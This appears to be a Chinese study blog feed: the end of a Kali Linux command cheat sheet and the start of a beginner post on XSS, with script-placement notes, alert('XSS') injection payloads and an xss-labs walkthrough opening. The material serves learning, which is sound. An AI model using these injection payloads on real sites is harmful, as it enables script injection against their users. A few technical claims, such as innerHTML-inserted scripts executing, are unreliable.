<li><code>find . -name &#39;.php&#39; -mmin -30</code> - 查找最近30分钟修改的当前目录下的.php文件</li>
<li><code>find . -name &#39;*.inc&#39; -mtime 0 -ls</code> - 查找最近24小时修改的文件并列出详细信息</li>
<li><code>find / -name *.rpm -exec chmod 755 &#39;{}&#39; \;</code> - 搜索并修改权限</li>
<li><code>find / -xdev -name *.rpm</code> - 搜索忽略可移动设备</li>
<li><code>locate *.ps</code> - 快速查找以.ps结尾的文件（需先运行<code>updatedb</code>）</li>
<li><code>whereis halt</code> - 显示二进制文件、源码或man的位置</li>
<li><code>which halt</code> - 显示二进制文件或可执行文件的完整路径</li>
<li><code>find / -name moonsec 2&gt;/dev/null</code> - 搜索文件&#x2F;文件夹并屏蔽错误信息</li>
</ul>
<h2 id="3-系统信息"><a href="#3-系统信息" class="headerlink" title="3. 系统信息"></a>3. 系统信息</h2><h3 id="硬件信息"><a href="#硬件信息" class="headerlink" title="硬件信息"></a>硬件信息</h3><ul>
<li><code>arch</code> - 显示机器的处理器架构</li>
<li><code>uname -m</code> - 显示机器的处理器架构</li>
<li><code>cat /proc/cpuinfo</code> - 显示CPU信息</li>
<li><code>cat /proc/mounts</code> - 显示已加载的文件系统</li>
<li><code>cat /proc/net/dev</code> - 显示网络适配器及统计</li>
</ul>
<h3 id="操作系统信息"><a href="#操作系统信息" class="headerlink" title="操作系统信息"></a>操作系统信息</h3><ul>
<li><code>uname -r</code> - 显示正在使用的内核版本</li>
<li><code>cat /proc/version</code> - 显示内核版本</li>
<li><code>ver</code> - 查看操作系统版本</li>
<li><code>systeminfo</code> - 查看计算机详细信息（Windows命令，Kali中不适用）</li>
</ul>
<h3 id="磁盘和内存信息"><a href="#磁盘和内存信息" class="headerlink" title="磁盘和内存信息"></a>磁盘和内存信息</h3><ul>
<li><code>df</code> - 显示磁盘空间使用情况（默认不带单位）</li>
<li><code>df -h</code> - 友好显示磁盘空间使用情况（带单位）</li>
<li><code>free</code> - 显示内存使用情况（默认以KB为单位）</li>
<li><code>free -m</code> - 以MB为单位显示内存使用情况</li>
<li><code>free -h</code> - 友好显示内存使用情况（自动选择合适单位）</li>
</ul>
<h2 id="4-用户和群组管理"><a href="#4-用户和群组管理" class="headerlink" title="4. 用户和群组管理"></a>4. 用户和群组管理</h2><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><ul>
<li><code>useradd moonsec</code> - 创建用户</li>
<li><code>useradd -r -m -s /bin/bash moonsec</code> - 创建系统用户并指定shell<ul>
<li><code>-r</code> - 建立系统账号</li>
<li><code>-m</code> - 自动建立用户的登录目录</li>
<li><code>-s /bin/bash</code> - 指定用户登录后使用的shell</li>
</ul>
</li>
<li><code>passwd moonsec</code> - 设置用户密码</li>
<li><code>usermod -a -G moontea k1</code> - 将用户k1添加到其他用户组</li>
</ul>
<h3 id="群组管理"><a href="#群组管理" class="headerlink" title="群组管理"></a>群组管理</h3><ul>
<li><code>groupadd group_name</code> - 创建新用户组</li>
<li><code>groupdel group_name</code> - 删除用户组</li>
<li><code>cat /etc/group | grep group_name</code> - 查看特定群组信息</li>
</ul>
<h2 id="5-进程管理"><a href="#5-进程管理" class="headerlink" title="5. 进程管理"></a>5. 进程管理</h2><h3 id="进程查看"><a href="#进程查看" class="headerlink" title="进程查看"></a>进程查看</h3><ul>
<li><code>top</code> - 实时查看系统进程和资源使用情况</li>
<li><code>ps -ef</code> - 查看所有进程信息</li>
<li><code>ps -ef | grep tomcat</code> - 查找指定进程</li>
<li><code>query user</code> - 查看当前在线的用户（Windows命令，Kali中不适用）</li>
</ul>
<h3 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h3><ul>
<li><code>kill -9 PID</code> - 强制杀死指定PID的进程</li>
<li><code>taskkill /pid PID数</code> - 终止指定PID的进程（Windows命令，Kali中不适用）</li>
</ul>
<h2 id="6-网络相关命令"><a href="#6-网络相关命令" class="headerlink" title="6. 网络相关命令"></a>6. 网络相关命令</h2><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><ul>
<li><code>ifconfig</code> - 查看和配置网络接口信息</li>
<li><code>iwconfig</code> - 配置或获取无线网络设备信息</li>
<li><code>route print</code> - 显示IP路由表（Windows命令）</li>
<li><code>arp</code> - 查看和处理ARP缓存</li>
<li><code>arp -a</code> - 显示所有ARP缓存信息</li>
<li><code>nbtstat -A ip</code> - 查看对方最近登录的用户名（Windows命令）</li>
</ul>
<h3 id="网络诊断"><a href="#网络诊断" class="headerlink" title="网络诊断"></a>网络诊断</h3><ul>
<li><code>ping www.baidu.com</code> - 测试网络连接</li>
<li><code>ping www.baidu.com -c 3</code> - 执行3次ping测试</li>
<li><code>netstat -a</code> - 查看所有端口</li>
<li><code>netstat -an</code> - 查看端口的网络连接情况</li>
<li><code>netstat -o</code> - 查看所有网络连接的进程ID</li>
<li><code>netstat -ano | findstr &quot;:80&quot;</code> - 查找包含”80”的连接（Windows命令）</li>
<li><code>netstat -v</code> - 查看正在进行的工作</li>
<li><code>netstat -p 协议名</code> - 查看某协议使用情况</li>
<li><code>netstat -s</code> - 查看所有协议使用情况</li>
<li><code>netstat -lntup</code> - 查看所有TCP和UDP端口</li>
<li><code>nslookup</code> - 查询DNS记录</li>
<li><code>nslookup -qt=type domain</code> - 查询特定类型的DNS记录</li>
<li><code>traceroute</code> - 检测数据包到达目标主机经过的网关数量</li>
<li><code>telnet</code> - 远程登录（常用于端口检测）</li>
<li><code>finger username @host</code> - 查看最近登录的用户信息</li>
</ul>
<h3 id="网络服务"><a href="#网络服务" class="headerlink" title="网络服务"></a>网络服务</h3><ul>
<li><code>http协议</code> - 使用curl和wget进行HTTP操作</li>
<li><code>curl</code> - 传输数据的命令行工具</li>
<li><code>wget</code> - 从网络下载文件</li>
</ul>
<h2 id="7-服务管理"><a href="#7-服务管理" class="headerlink" title="7. 服务管理"></a>7. 服务管理</h2><h3 id="服务控制"><a href="#服务控制" class="headerlink" title="服务控制"></a>服务控制</h3><ul>
<li><code>/etc/init.d/apache2 start</code> - 启动Apache2服务</li>
<li><code>/etc/init.d/apache2 restart</code> - 重启Apache2服务</li>
<li><code>/etc/init.d/apache2 stop</code> - 停止Apache2服务</li>
<li><code>/etc/init.d/network start</code> - 启动网络服务</li>
<li><code>service networking restart</code> - 重启网络服务</li>
<li><code>systemctl restart networking</code> - 使用systemctl重启网络服务</li>
</ul>
<h3 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h3><ul>
<li><code>/etc/rc.d/rc.local</code> - 开机自启动脚本配置文件</li>
<li><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code> - 开启路由转发</li>
</ul>
<h2 id="8-包管理"><a href="#8-包管理" class="headerlink" title="8. 包管理"></a>8. 包管理</h2><h3 id="Debian-Ubuntu包管理"><a href="#Debian-Ubuntu包管理" class="headerlink" title="Debian&#x2F;Ubuntu包管理"></a>Debian&#x2F;Ubuntu包管理</h3><ul>
<li><code>apt-get update</code> - 更新软件包列表</li>
<li><code>apt-get upgrade</code> - 升级已安装的软件包</li>
<li><code>apt-get dist-upgrade</code> - 智能升级，处理依赖关系变化</li>
<li><code>apt-get install package</code> - 安装软件包</li>
<li><code>apt-get install python-模块名</code> - 安装Python模块</li>
<li><code>apt-get autoremove --purge 软件名</code> - 删除包及其依赖和配置文件</li>
<li><code>dpkg -i package.deb</code> - 安装&#x2F;更新deb包</li>
<li><code>dpkg -r package_name</code> - 从系统删除deb包</li>
<li><code>dpkg -l</code> - 显示所有已安装的deb包</li>
<li><code>dpkg -l | grep httpd</code> - 显示包含特定名称的deb包</li>
<li><code>dpkg -s package_name</code> - 获取已安装包的信息</li>
<li><code>dpkg -L package_name</code> - 显示已安装包提供的文件列表</li>
</ul>
<h3 id="压缩与解压"><a href="#压缩与解压" class="headerlink" title="压缩与解压"></a>压缩与解压</h3><ul>
<li><code>bzip2 file1</code> - 压缩文件</li>
<li><code>gunzip file1.gz</code> - 解压gzip文件</li>
<li><code>gzip file1</code> - 压缩文件</li>
<li><code>gzip -9 file1</code> - 最大程度压缩</li>
<li><code>rar a file1.rar test_file</code> - 创建rar压缩包</li>
<li><code>rar x file1.rar</code> - 解压rar包</li>
<li><code>unrar x file1.rar</code> - 解压rar包</li>
<li><code>tar zcvf 压缩文件名 压缩文件</code> - 创建gzip压缩的tar包</li>
<li><code>tar zxvf 解压包名</code> - 解压gzip压缩的tar包</li>
<li><code>tar -jcvf 压缩文件名</code> - 创建bzip2压缩的tar包</li>
<li><code>tar jxvf 解压包名</code> - 解压bzip2压缩的tar包</li>
<li><code>zip -q -r 压缩文件名 目录</code> - 创建zip压缩包</li>
<li><code>unzip 压缩文件名</code> - 解压zip压缩包</li>
</ul>
<h2 id="9-文本编辑"><a href="#9-文本编辑" class="headerlink" title="9. 文本编辑"></a>9. 文本编辑</h2><h3 id="vi-vim编辑器"><a href="#vi-vim编辑器" class="headerlink" title="vi&#x2F;vim编辑器"></a>vi&#x2F;vim编辑器</h3><h4 id="三种模式"><a href="#三种模式" class="headerlink" title="三种模式"></a>三种模式</h4><ol>
<li><strong>命令模式</strong> - 控制光标移动，进行删除、复制等操作</li>
<li><strong>插入模式</strong> - 输入文本内容</li>
<li><strong>底行模式</strong> - 保存、退出、搜索等</li>
</ol>
<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><ul>
<li><code>vi filename</code> - 打开或新建文件，光标置于第一行首</li>
<li><code>vi +n filename</code> - 打开文件，光标置于第n行首</li>
<li><code>vi + filename</code> - 打开文件，光标置于最后一行首</li>
<li><code>i</code> - 在当前位置前插入</li>
<li><code>I</code> - 在当前行首插入</li>
<li><code>a</code> - 在当前位置后插入</li>
<li><code>A</code> - 在当前行尾插入</li>
<li><code>o</code> - 在当前行之后插入一行</li>
<li><code>O</code> - 在当前行之前插入一行</li>
<li><code>dd</code> - 删除当前行</li>
<li><code>2dd</code> - 删除2行</li>
<li><code>yy</code> - 复制当前行</li>
<li><code>nyy</code> - 复制当前行及之后n行</li>
<li><code>p</code> - 在当前光标后粘贴</li>
<li><code>u</code> - 撤销操作</li>
</ul>
<h4 id="查找与替换"><a href="#查找与替换" class="headerlink" title="查找与替换"></a>查找与替换</h4><ul>
<li><code>/text</code> - 向下查找text</li>
<li><code>?text</code> - 向上查找text</li>
<li><code>n</code> - 查找下一个匹配</li>
<li><code>N</code> - 查找上一个匹配</li>
</ul>
<h4 id="退出命令"><a href="#退出命令" class="headerlink" title="退出命令"></a>退出命令</h4><ul>
<li><code>:wq</code> - 保存并退出</li>
<li><code>:q!</code> - 强制退出忽略更改</li>
<li><code>:e!</code> - 放弃修改并重新打开文件</li>
<li><code>:w</code> - 保存修改</li>
<li><code>set number</code> 或 <code>set nu</code> - 显示行号</li>
<li><code>:n</code> - 跳转到第n行</li>
</ul>
<h2 id="10-其他实用命令"><a href="#10-其他实用命令" class="headerlink" title="10. 其他实用命令"></a>10. 其他实用命令</h2><h3 id="防火墙管理"><a href="#防火墙管理" class="headerlink" title="防火墙管理"></a>防火墙管理</h3><ul>
<li><code>iptables -L</code> - 查看防火墙规则</li>
<li><code>iptables -F</code> - 清除防火墙规则</li>
<li><code>/etc/init.d/iptables stop</code> - 停止iptables防火墙</li>
<li><code>service iptables stop</code> - 停止iptables防火墙</li>
<li><code>ufw disable</code> - 禁用UFW防火墙</li>
<li><code>ufw enable</code> - 启用UFW防火墙</li>
</ul>
<h3 id="网络共享"><a href="#网络共享" class="headerlink" title="网络共享"></a>网络共享</h3><ul>
<li><code>mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share</code> - 挂载Windows网络共享</li>
</ul>
<h3 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h3><ul>
<li><code>/etc/network/interfaces</code> - 网卡配置文件路径</li>
<li><code>ifconfig eth0 192.168.0.33</code> - 设置临时IP地址</li>
</ul>
<h3 id="DNS配置"><a href="#DNS配置" class="headerlink" title="DNS配置"></a>DNS配置</h3><ul>
<li><code>/etc/resolv.conf</code> - DNS配置文件路径</li>
<li><code>nameserver 114.114.114.114</code> - 设置DNS服务器</li>
</ul>
<h3 id="系统工具"><a href="#系统工具" class="headerlink" title="系统工具"></a>系统工具</h3><ul>
<li><code>wmic product &gt; ins.txt</code> - 查看安装软件信息（Windows命令）</li>
<li><code>systeminfo</code> - 查看系统信息（Windows命令）</li>
<li><code>whoami</code> - 查看当前用户及权限（Windows命令）</li>
<li><code>whoami /all</code> - 查看当前用户详细权限信息（Windows命令）</li>
</ul>
<hr>
<p><em>注：本笔记中包含部分Windows命令，已特别标注。Kali Linux主要使用Linux命令，部分命令可能需要root权限才能执行。</em></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS漏洞基础</title>
    <url>/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本人是个网安菜鸡，这是写的第一篇有关XSS漏洞学习的博客，请多多指教。</p>
<p>1.由于不可以在非代码区书写完整的html标签 用   [ ]  代替 &lt;  &gt;</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sript</span>&gt;</span>   --&gt;   [script]  </span><br></pre></td></tr></table></figure>
<p>2.作者用的是chrome浏览器，不同的浏览器回显的网页代码颜色或是容错规则方面有差异</p>
<hr>
<h1 id="一、xss漏洞是什么？"><a href="#一、xss漏洞是什么？" class="headerlink" title="一、xss漏洞是什么？"></a>一、xss漏洞是什么？</h1><p>XSS（跨站脚本攻击，Cross-Site Scripting）是一种常见的Web安全漏洞，攻击者通过向网页中注入恶意脚本代码，当其他用户访问该页面时，这些脚本会在其浏览器中执行，从而导致数据泄露、会话劫持、钓鱼攻击等安全问题</p>
<hr>
<h1 id="二、xss漏洞的基本知识"><a href="#二、xss漏洞的基本知识" class="headerlink" title="二、xss漏洞的基本知识"></a>二、xss漏洞的基本知识</h1><h2 id="1-HTML-中的「文本标签」"><a href="#1-HTML-中的「文本标签」" class="headerlink" title="1.HTML 中的「文本标签」"></a>1.HTML 中的「文本标签」</h2><blockquote>
<p>通常指用于包裹文本内容的标签，例如：<br>段落标签：p、h1-h6<br>行内容器：span、em、strong<br>列表项：li<br>其他文本容器：div、section（虽然通用，但常用于包裹文本块）</p>
</blockquote>
<hr>
<h2 id="2-script-嵌套在不同标签下的脚本运行情况"><a href="#2-script-嵌套在不同标签下的脚本运行情况" class="headerlink" title="2.script 嵌套在不同标签下的脚本运行情况"></a>2.script 嵌套在不同标签下的脚本运行情况</h2><h3 id="脚本执行的核心规则"><a href="#脚本执行的核心规则" class="headerlink" title="*脚本执行的核心规则"></a>*脚本执行的核心规则</h3><ul>
<li>浏览器纠错机制<br>HTML 解析器会尝试修复非法嵌套，将 script 移到允许的位置（如父容器外部），确保脚本执行。</li>
<li>内容模型（Content Model）限制<br>每个 HTML 标签有允许嵌套的内容类型（如流内容、短语内容等），非法嵌套可能导致 DOM 结构变化。</li>
<li>安全策略影响<br>如 CSP（内容安全策略）会阻止未授权的内联脚本或外部资源。</li>
</ul>
<h3 id="补充知识"><a href="#补充知识" class="headerlink" title="*补充知识"></a>*补充知识</h3><blockquote>
<p>1.浏览器在解析javascript的属性值时，是支持十进制或是十六进制的unicode编码<br>2.URL编码，也叫百分号编码，是用来将特殊字符转换成可以在URL中安全使用的格式，通常用%加上两位的十六进制数来表示<br>3. alert(“ “)  alert(‘ ‘)   双引号与单引号均可以<br> 4. console.log(‘ ‘)    &#x2F;(“ “)    控制台输出<br>5.url编码的字符-&gt;搜索<br>6.多个键值对的输入用&amp;分割<br>7.align（对齐）属性或相关标签（比如 [div align&#x3D;”center”]），这在早期的 HTML 中用于对齐内容，但现代开发中已不推荐使用，建议改用 CSS 实现对齐。<br>8.前后符号最好都闭合，防止浏览器非预期‘容错’，也可以活动注释符号<br>9.src，href<br>10.gfi文件格式</p>
</blockquote>
<p>在 XSS 攻击或前端开发中，<code>&lt;script&gt;</code> 标签的<strong>嵌套位置</strong>和<strong>上下文环境</strong>会直接影响脚本的执行行为。以下是不同场景下的详细分析：</p>
<hr>
<p>在 XSS 攻击或前端开发中，<code>&lt;script&gt;</code> 标签的<strong>嵌套位置</strong>和<strong>上下文环境</strong>会直接影响脚本的执行行为。以下是不同场景下的详细分析：</p>
<hr>
<h3 id="1-标签的标准位置"><a href="#1-标签的标准位置" class="headerlink" title="1. &lt;script&gt; 标签的标准位置"></a>1. <code>&lt;script&gt;</code> 标签的标准位置</h3><p>HTML 规范允许 <code>&lt;script&gt;</code> 标签出现在 <strong><code>&lt;head&gt;</code></strong> 或 <strong><code>&lt;body&gt;</code></strong> 中，但行为略有差异：</p>
<ul>
<li><strong>在 <code>&lt;head&gt;</code> 中</strong>：<ul>
<li>脚本默认<strong>同步加载和执行</strong>，会阻塞 HTML 解析。</li>
<li>适合初始化代码或依赖库（如 jQuery）。</li>
</ul>
</li>
<li><strong>在 <code>&lt;body&gt;</code> 末尾</strong>：<ul>
<li>延迟加载，避免阻塞页面渲染。</li>
<li>适合操作 DOM 的代码（需确保 DOM 已加载）。</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Head 中的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Body 末尾的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-嵌套在其他标签内"><a href="#2-嵌套在其他标签内" class="headerlink" title="2. &lt;script&gt; 嵌套在其他标签内"></a>2. <code>&lt;script&gt;</code> 嵌套在其他标签内</h3><h4 id="场景-1：普通容器标签（如-、）"><a href="#场景-1：普通容器标签（如-、）" class="headerlink" title="场景 1：普通容器标签（如 &lt;div&gt;、&lt;span&gt;）"></a>场景 1：普通容器标签（如 <code>&lt;div&gt;</code>、<code>&lt;span&gt;</code>）</h4><ul>
<li><strong>脚本仍会执行</strong>，但需注意<strong>执行时机</strong>：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;嵌套在 div 中的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>当 HTML 解析到此处时立即执行。</li>
<li>如果容器标签被动态插入（如通过 JS），脚本会在插入时执行。</li>
</ul>
</li>
</ul>
<h4 id="场景-2：表单标签（如-）"><a href="#场景-2：表单标签（如-）" class="headerlink" title="场景 2：表单标签（如 &lt;form&gt;）"></a>场景 2：表单标签（如 <code>&lt;form&gt;</code>）</h4><ul>
<li>脚本正常执行，但可能破坏表单结构：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;表单内的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="场景-3：表格标签（如-、）"><a href="#场景-3：表格标签（如-、）" class="headerlink" title="场景 3：表格标签（如 &lt;table&gt;、&lt;tr&gt;）"></a>场景 3：表格标签（如 <code>&lt;table&gt;</code>、<code>&lt;tr&gt;</code>）</h4><ul>
<li>部分浏览器可能因 HTML 解析规则拒绝执行：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;表格内的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- 可能不执行 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>应避免将 <code>&lt;script&gt;</code> 直接放在 <code>&lt;table&gt;</code> 或 <code>&lt;tr&gt;</code> 内。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-在特殊标签中的行为"><a href="#3-在特殊标签中的行为" class="headerlink" title="3. &lt;script&gt; 在特殊标签中的行为"></a>3. <code>&lt;script&gt;</code> 在特殊标签中的行为</h3><h4 id="场景-1：-标签"><a href="#场景-1：-标签" class="headerlink" title="场景 1：&lt;noscript&gt; 标签"></a>场景 1：<code>&lt;noscript&gt;</code> 标签</h4><ul>
<li>仅当浏览器<strong>禁用 JavaScript</strong> 时，<code>&lt;noscript&gt;</code> 内的内容会显示：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;不会执行&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>请启用 JavaScript<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>内部的 <code>&lt;script&gt;</code> <strong>永远不会执行</strong>。</li>
</ul>
</li>
</ul>
<h4 id="场景-2：-标签"><a href="#场景-2：-标签" class="headerlink" title="场景 2：&lt;template&gt; 标签"></a>场景 2：<code>&lt;template&gt;</code> 标签</h4><ul>
<li><code>&lt;template&gt;</code> 内的内容被视为<strong>惰性文档片段</strong>，脚本不会执行：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;模板中的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>只有当内容被克隆并插入 DOM 后，脚本才会执行。</li>
</ul>
</li>
</ul>
<h4 id="场景-3：SVG-或-MathML-标签"><a href="#场景-3：SVG-或-MathML-标签" class="headerlink" title="场景 3：SVG 或 MathML 标签"></a>场景 3：SVG 或 MathML 标签</h4><ul>
<li>在 SVG&#x2F;MathML 中嵌入 <code>&lt;script&gt;</code>，行为与 HTML 一致：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;SVG 中的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="4-动态插入的"><a href="#4-动态插入的" class="headerlink" title="4. 动态插入的 &lt;script&gt;"></a>4. 动态插入的 <code>&lt;script&gt;</code></h3><p>通过 JavaScript 动态创建的 <code>&lt;script&gt;</code> 标签，行为受插入位置影响：</p>
<h4 id="插入到-或-中："><a href="#插入到-或-中：" class="headerlink" title="插入到 &lt;head&gt; 或 &lt;body&gt; 中："></a>插入到 <code>&lt;head&gt;</code> 或 <code>&lt;body&gt;</code> 中：</h4><ul>
<li>脚本异步加载，默认不阻塞页面：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;file.js&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script); <span class="comment">// 或 document.body</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="插入到其他容器中（如-）："><a href="#插入到其他容器中（如-）：" class="headerlink" title="插入到其他容器中（如 &lt;div&gt;）："></a>插入到其他容器中（如 <code>&lt;div&gt;</code>）：</h4><ul>
<li>脚本仍会执行，但可能因容器未渲染而无法操作其内部 DOM：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;script&gt;console.log(&quot;动态脚本&quot;);&lt;\/script&gt;&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(div);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="5-XSS-攻击中的-嵌套利用"><a href="#5-XSS-攻击中的-嵌套利用" class="headerlink" title="5. XSS 攻击中的 &lt;script&gt; 嵌套利用"></a>5. XSS 攻击中的 <code>&lt;script&gt;</code> 嵌套利用</h3><p>攻击者可能尝试在非标准位置注入脚本以绕过过滤：</p>
<h4 id="场景-1：属性内的脚本"><a href="#场景-1：属性内的脚本" class="headerlink" title="场景 1：属性内的脚本"></a>场景 1：属性内的脚本</h4><ul>
<li>利用事件属性执行代码（无需 <code>&lt;script&gt;</code> 标签）：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span> <span class="comment">&lt;!-- 通过事件触发 --&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="场景-2：闭合标签注入"><a href="#场景-2：闭合标签注入" class="headerlink" title="场景 2：闭合标签注入"></a>场景 2：闭合标签注入</h4><ul>
<li>通过闭合父标签提前结束上下文，插入 <code>&lt;script&gt;</code>：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- 闭合原有标签 --&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="场景-3：利用-HTML-解析特性"><a href="#场景-3：利用-HTML-解析特性" class="headerlink" title="场景 3：利用 HTML 解析特性"></a>场景 3：利用 HTML 解析特性</h4><ul>
<li>某些上下文允许省略闭合标签或特殊字符：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 实际不会执行，因为 &lt;script&gt; 被当作文本内容 --&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h1 id="三、xss-labs解题思路-源码分析"><a href="#三、xss-labs解题思路-源码分析" class="headerlink" title="三、xss-labs解题思路+源码分析"></a>三、xss-labs解题思路+源码分析</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>类型：url类性</p>
<p>解题思路：<br>1.第一个没有任何的输入框，点解图片也没有任何变化<br>2.突破口-&gt;网址栏-&gt;随便输入几次数据观察网页情况<br>3.查看网页源码-&gt;变化化处的标签</p>
